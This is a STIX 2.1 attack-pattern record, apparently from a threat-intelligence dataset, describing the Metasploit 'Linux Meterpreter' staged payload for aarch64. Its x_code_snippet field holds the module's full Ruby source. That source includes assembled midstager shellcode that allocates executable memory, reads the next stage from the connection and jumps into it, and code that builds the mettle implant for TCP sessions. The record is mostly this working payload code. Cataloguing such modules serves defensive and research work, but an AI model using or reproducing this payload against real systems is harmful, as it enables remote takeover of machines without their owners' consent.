{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d25b46cb-3bd3-483c-ac20-a1ce66579df9",
    "created": "2024-08-14T16:33:19.270319Z",
    "modified": "2024-08-14T16:33:19.270323Z",
    "name": "Linux Meterpreter",
    "description": "Inject the mettle server payload (staged)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stages/linux/aarch64/meterpreter.rb",
            "external_id": "meterpreter.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/elfparsey'\n\nmodule MetasploitModule\n  include Msf::Sessions::MeterpreterOptions\n  include Msf::Sessions::MettleConfig\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'          => 'Linux Meterpreter',\n        'Description'   => 'Inject the mettle server payload (staged)',\n        'Author'        => [\n          'Adam Cammack <adam_cammack[at]rapid7.com>'\n        ],\n        'Platform'      => 'linux',\n        'Arch'          => ARCH_AARCH64,\n        'License'       => MSF_LICENSE,\n        'Session'       => Msf::Sessions::Meterpreter_aarch64_Linux\n      )\n    )\n  end\n\n  def elf_ep(payload)\n    elf = Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload))\n    elf.elf_header.e_entry\n  end\n\n  def handle_intermediate_stage(conn, payload)\n    entry_offset = elf_ep(payload)\n\n    # Generated from external/source/shellcode/linux/aarch64/stage_mettle.s\n    midstager = [\n\n            0x10000782,          #  adr\tx2, f0 <size>\n            0xb9400042,          #  ldr\tw2, [x2]\n            0xaa0203ea,          #  mov\tx10, x2\n            0xd34cfc42,          #  lsr\tx2, x2, #12\n            0x91000442,          #  add\tx2, x2, #0x1\n            0xd374cc42,          #  lsl\tx2, x2, #12\n            0xaa1f03e0,          #  mov\tx0, xzr\n            0xaa0203e1,          #  mov\tx1, x2\n            0xd28000e2,          #  mov\tx2, #0x7                   \t// #7\n            0xd2800443,          #  mov\tx3, #0x22                  \t// #34\n            0xaa1f03e4,          #  mov\tx4, xzr\n            0xaa1f03e5,          #  mov\tx5, xzr\n            0xd2801bc8,          #  mov\tx8, #0xde                  \t// #222\n            0xd4000001,          #  svc\t#0x0\n            0xaa0a03e4,          #  mov\tx4, x10\n            0xaa0003e3,          #  mov\tx3, x0\n            0xaa0003ea,          #  mov\tx10, x0\n            0xaa0c03e0,          #  mov\tx0, x12\n            0xaa0303e1,          #  mov\tx1, x3\n            0xaa0403e2,          #  mov\tx2, x4\n            0xd28007e8,          #  mov\tx8, #0x3f                  \t// #63\n            0xd4000001,          #  svc\t#0x0\n            0x34000440,          #  cbz\tw0, e0 <failed>\n            0x8b000063,          #  add\tx3, x3, x0\n            0xeb000084,          #  subs\tx4, x4, x0\n            0x54ffff01,          #  b.ne\t44 <read_loop>\n            0x10000480,          #  adr\tx0, f8 <entry>\n            0xf9400000,          #  ldr\tx0, [x0]\n            0x8b0a0000,          #  add\tx0, x0, x10\n            0xaa0003ee,          #  mov\tx14, x0\n            0x910003e0,          #  mov\tx0, sp\n            0x927cec1f,          #  and\tsp, x0, #0xfffffffffffffff0\n            0x910183ff,          #  add\tsp, sp, #0x60\n            0xd2800040,          #  mov\tx0, #0x2                   \t// #2\n            0xd2800da1,          #  mov\tx1, #0x6d                  \t// #109\n            0xf90003e1,          #  str\tx1, [sp]\n            0x910003e1,          #  mov\tx1, sp\n            0xaa0c03e2,          #  mov\tx2, x12\n            0xd2800003,          #  mov\tx3, #0x0                   \t// #0\n            0xd2800004,          #  mov\tx4, #0x0                   \t// #0\n            0xd28000e5,          #  mov\tx5, #0x7                   \t// #7\n            0xaa0a03e6,          #  mov\tx6, x10\n            0xd28000c7,          #  mov\tx7, #0x6                   \t// #6\n            0xd2820008,          #  mov\tx8, #0x1000                \t// #4096\n            0xd2800329,          #  mov\tx9, #0x19                  \t// #25\n            0xaa0a03ea,          #  mov\tx10, x10\n            0xd280000b,          #  mov\tx11, #0x0                   \t// #0\n            0xa9bf2fea,          #  stp\tx10, x11, [sp,#-16]!\n            0xa9bf27e8,          #  stp\tx8, x9, [sp,#-16]!\n            0xa9bf1fe6,          #  stp\tx6, x7, [sp,#-16]!\n            0xa9bf17e4,          #  stp\tx4, x5, [sp,#-16]!\n            0xa9bf0fe2,          #  stp\tx2, x3, [sp,#-16]!\n            0xa9bf07e0,          #  stp\tx0, x1, [sp,#-16]!\n            0xd280001d,          #  mov\tx29, #0x0                   \t// #0\n            0xd280001e,          #  mov\tx30, #0x0                   \t// #0\n            0xd61f01c0,          #  br\tx14\n            0xd2800000,          #  mov\tx0, #0x0                   \t// #0\n            0xd2800ba8,          #  mov\tx8, #0x5d                  \t// #93\n            0xd4000001,          #  svc\t#0x0\n            0xd503201f,          #  nop\n            payload.length,\n            0x00000000,          #  .word\t0x00000000\n            entry_offset,\n            0x00000000,          #  .word\t0x00000000\n        ].pack('V*')\n\n    print_status(\"Transmitting intermediate midstager...(#{midstager.length} bytes)\")\n    conn.put([midstager.length].pack('V'))\n    conn.put(midstager) == midstager.length\n  end\n\n  def generate_stage(opts = {})\n    config_opts = {scheme: 'tcp'}.merge(mettle_logging_config(opts))\n    MetasploitPayloads::Mettle.new('aarch64-linux-musl',\n      generate_config(opts.merge(config_opts))).to_binary :process_image\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}